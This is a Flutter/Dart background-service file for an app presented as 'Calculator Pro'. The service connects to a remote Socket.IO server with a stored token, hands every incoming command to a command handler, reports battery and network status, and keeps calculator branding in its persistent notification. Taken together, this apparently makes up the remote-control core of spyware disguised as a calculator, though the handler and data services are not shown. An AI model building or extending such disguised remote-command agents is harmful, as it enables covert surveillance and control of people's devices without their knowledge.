import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';

import '../../core/utils/logger.dart';
import '../../core/utils/app_settings.dart';
import '../../services/socket_io_service.dart';
import '../../services/heartbeat_service.dart';
import '../../services/command_handler.dart';
import '../../services/token_service.dart';
import '../../services/hardware/device_info_service.dart';

@pragma('vm:entry-point')
Future<void> onBackgroundServiceStart(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();
  AppLogger.i('BgService', 'Background service started');

  service.on('stopService').listen((event) {
    AppLogger.i('BgService', 'Stop service requested');
    service.stopSelf();
  });

  final socketIO = SocketIOService();
  final heartbeat = HeartbeatService();
  final tokenService = TokenService();
  final deviceInfo = DeviceInfoService();

  // Check for existing token
  final token = await tokenService.getToken();
  if (token == null) {
    AppLogger.w('BgService', 'No token found, waiting for connection from UI');
    return;
  }

  // Setup command handler
  final commandHandler = CommandHandler();

  socketIO.onCommandReceived = (command) {
    commandHandler.handleCommand(command);
  };

  socketIO.onConnectionChanged = (connected) {
    if (connected) {
      heartbeat.start();
    } else {
      heartbeat.stop();
    }
  };

  // Connect
  final serverUrl = AppSettings.serverUrl;
  await socketIO.connect(token, serverUrl: serverUrl);

  // Update notification periodically
  service.on('updateNotification').listen((event) async {
    final status = await heartbeat.getCurrentStatus();
    await service.setNotificationInfo(
      title: 'Calculator Pro — Connected',
      body: 'Battery: ${status.batteryLevel}% | ${status.networkType}',
    );
  });
}

class BackgroundServiceManager {
  static final BackgroundServiceManager _instance = BackgroundServiceManager._();
  factory BackgroundServiceManager() => _instance;
  BackgroundServiceManager._();

  final _service = FlutterBackgroundService();

  Future<void> initialize() async {
    AppLogger.i('BgService', 'Configuring background service');

    await _service.configure(
      androidConfiguration: AndroidConfiguration(
        onStart: onBackgroundServiceStart,
        autoStart: false,
        isForegroundMode: true,
        notificationChannelId: 'calculator_service',
        initialNotificationTitle: 'Calculator Pro',
        initialNotificationContent: 'Running in background',
        foregroundServiceNotificationId: 888,
        foregroundServiceTypes: [ForegroundServiceType.dataSync],
      ),
      iosConfiguration: IosConfiguration(
        autoStart: false,
        onForeground: onBackgroundServiceStart,
        onBackground: onBackgroundServiceStart,
      ),
    );
  }

  Future<void> start() async {
    await _service.startService();
    AppLogger.i('BgService', 'Service started');
  }

  Future<void> stop() async {
    await _service.stopService();
    AppLogger.i('BgService', 'Service stopped');
  }

  bool get isRunning => _service.isRunning();
}